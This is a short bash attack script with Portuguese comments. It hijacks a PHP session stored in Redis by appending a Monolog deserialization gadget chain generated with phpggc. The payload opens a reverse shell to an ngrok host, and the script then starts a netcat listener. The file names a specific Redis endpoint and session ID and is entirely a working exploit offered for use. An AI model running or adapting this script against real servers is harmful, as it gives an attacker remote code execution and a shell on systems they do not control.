#!/bin/bash
#O script visa usar vulnerabilidade de desserealização insegura do Monolog, fazendo um sequestro de sessão no Redis, adicionando um pauload para conexão reversa
HOST="0.tcp.sa.ngrok.io"
PORT=12928
REDIS="redis-e592c95604995990.elb.us-east-1.amazonaws.com"
SESSION=300105bc003b2d98ac29dc135ec0a091
php phpggc Monolog/RCE8 system "php -r '\$sock=fsockopen(\"$HOST\",$PORT);\`bash <&3 >&3 2>&3\`;'" -b | base64 -d | sed 's/^/data\|/' > key

#redis-cli -h $REDIS -p 6379 <<<
#set SESSION "data|"

redis-cli -h $REDIS -p 6379 -x APPEND "PHPREDIS_SESSION:$SESSION" < key

echo "[+] - Abrindo porta de conexão reversa na porta 8443..."
echo "[!!] Acesse o browser para fazera conexão reversa!"
nc -lvp 8443
